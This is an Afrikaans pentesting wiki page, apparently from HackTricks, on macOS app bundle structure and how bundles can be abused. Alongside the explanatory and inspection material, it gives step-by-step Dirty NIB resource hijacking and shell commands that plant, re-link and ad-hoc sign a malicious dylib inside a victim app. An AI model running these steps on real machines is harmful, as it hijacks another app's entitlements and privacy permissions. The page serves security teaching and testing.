# macOS Bundels

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

Bundels in macOS dien as houers vir verskeie hulpbronne, insluitend toepassings, biblioteke en ander nodige lêers, wat dit in Finder as enkel voorwerpe laat verskyn, soos die bekende `*.app`-lêers. Die mees algemene bundel is die `.app`-bundel, maar ander tipes soos `.framework`, `.systemextension` en `.kext` kom ook gereeld voor.

### Belangrike Komponente van 'n Bundel

Binne 'n bundel, veral in die `<application>.app/Contents/`-gids, word verskeie belangrike hulpbronne gehou:

- **\_CodeSignature**: Hierdie gids stoor code-signing besonderhede wat noodsaaklik is om die integriteit van die toepassing te verifieer. Jy kan die code-signing-inligting ondersoek met opdragte soos:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Bevat die uitvoerbare binêre van die toepassing wat by gebruikerinteraksie hardloop.
- **Resources**: 'n Stoorkamer vir die toepassing se gebruikerskoppelvlakkomponente, insluitend beelde, dokumente en koppelvlak-beskrywings (nib/xib lêers).
- **Info.plist**: Dien as die toepassing se hoofkonfigurasielêer, kritiek sodat die stelsel die toepassing korrek kan herken en daarmee kan kommunikeer.

#### Belangrike sleutels in Info.plist

Die `Info.plist`-lêer is 'n hoeksteen vir toepassingskonfigurasie en bevat sleutels soos:

- **CFBundleExecutable**: Gee die naam van die hoof uitvoerbare lêer wat in die `Contents/MacOS`-gids geleë is.
- **CFBundleIdentifier**: Verskaf 'n globale identifiseerder vir die toepassing wat wyd deur macOS vir toepassingsbestuur gebruik word.
- **LSMinimumSystemVersion**: Wys die minimum weergawe van macOS aan wat benodig word om die toepassing te laat loop.

### Bundels verken

Om die inhoud van 'n bundel te verken, soos `Safari.app`, kan die volgende opdrag gebruik word: `bash ls -lR /Applications/Safari.app/Contents`

Hierdie verkenning openbaar gidse soos `_CodeSignature`, `MacOS`, `Resources`, en lêers soos `Info.plist`, elk met 'n spesifieke doel — van die beveiliging van die toepassing tot die definiëring van sy gebruikerskoppelvlak en operasionele parameters.

#### Addisionele bundelgidse

Benewens die algemene gidse kan bundels ook insluit:

- **Frameworks**: Bevat ingeslote frameworks wat deur die toepassing gebruik word. Frameworks is soos dylibs met ekstra hulpbronne.
- **PlugIns**: 'n Gids vir plug-ins en uitbreidings wat die toepassing se vermoëns vergroot.
- **XPCServices**: Huisves XPC-dienste wat deur die toepassing vir kommunikasie buite die proses gebruik word.

Hierdie struktuur verseker dat alle nodige komponente binne die bundel gekapsel is, wat 'n modulêre en veilige toepassingsomgewing moontlik maak.

Vir meer gedetailleerde inligting oor `Info.plist`-sleutels en hul betekenisse, bied die Apple-ontwikkelaarsdokumentasie uitgebreide hulpbronne: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Sekuriteitsnotas & Misbruikvektore

- **Gatekeeper / App Translocation**: Wanneer 'n gekwarantyneerde bundel vir die eerste keer uitgevoer word, voer macOS 'n diep handtekeningverifikasie uit en kan dit van 'n gerandomiseerde, getranslokeerde pad af loop. Sodra dit aanvaar is, voer latere draaie slegs vlakke kontroles uit; hulpbronlêers in `Resources/`, `PlugIns/`, nibs, ens., is histories ongekontroleer. Sedert macOS 13 Ventura word 'n diep kontrole op die eerste uitvoering afgedwing en die nuwe *App Management* TCC-permissie beperk derde‑party‑prosesse om ander bundels sonder gebruikerstoestemming te wysig, maar ouer stelsels bly kwesbaar.
- **Bundle Identifier collisions**: Meervoudige ingeslote teikens (PlugIns, helper‑tools) wat dieselfde `CFBundleIdentifier` hergebruik, kan handtekeningverifikasie breek en soms URL‑skema kaping/verwarring moontlik maak. Tel altyd sub‑bundels op en verifieer unieke ID's.

## Resource Hijacking (Dirty NIB / NIB Injection)

Voor Ventura kon die verwisseling van UI-hulpbronne in 'n ondertekende app shallow code signing omseil en code execution met die app se entitlements tot gevolg hê. Huidige navorsing (2024) wys dat dit steeds op pre‑Ventura en op nie‑gekwarantyneerde bouens werk:

1. Kopieer teiken-app na 'n skryfbare ligging (bv. `/tmp/Victim.app`).
2. Vervang `Contents/Resources/MainMenu.nib` (of enige nib wat in `NSMainNibFile` verklaar is) met 'n kwaadwillige een wat `NSAppleScript`, `NSTask`, ens. instansieer.
3. Begin die app. Die kwaadwillige nib voer uit onder die slagoffer se bundle-ID en entitlements (TCC-toekennings, mikrofoon/kamera, ens.).
4. Ventura+ beperk dit deur die bundel by die eerste opstart diep te verifieer en vereis die *App Management* TCC‑permit vir latere wysigings, sodat persistensie moeiliker is; aanvanklike-opstartaanvalle op ouer macOS bly egter van toepassing.

Minimale kwaadwillige nib-payload voorbeeld (compileer xib na nib met `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking binne Bundles

Omdat `@rpath`-opsoeke voorkeur gee aan gebundelde Frameworks/PlugIns, kan die plasing van 'n kwaadwillige library binne `Contents/Frameworks/` of `Contents/PlugIns/` die laaivolgorde herlei wanneer die hoof-binary geteken is sonder library validation of met swak `LC_RPATH`-ordening.

Tipiese stappe wanneer 'n unsigned/ad‑hoc bundle misbruik word:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
- Hardened runtime — as `com.apple.security.cs.disable-library-validation` ontbreek — blokkeer third‑party dylibs; kontroleer entitlements eers.
- XPC services onder `Contents/XPCServices/` laai dikwels sibling frameworks — patch hul binaries op dieselfde manier vir persistence of privilege escalation-paadjies.

## Vinnige Inspeksie Spiekbrief
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Verwysings

- [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
{{#include ../../../banners/hacktricks-training.md}}
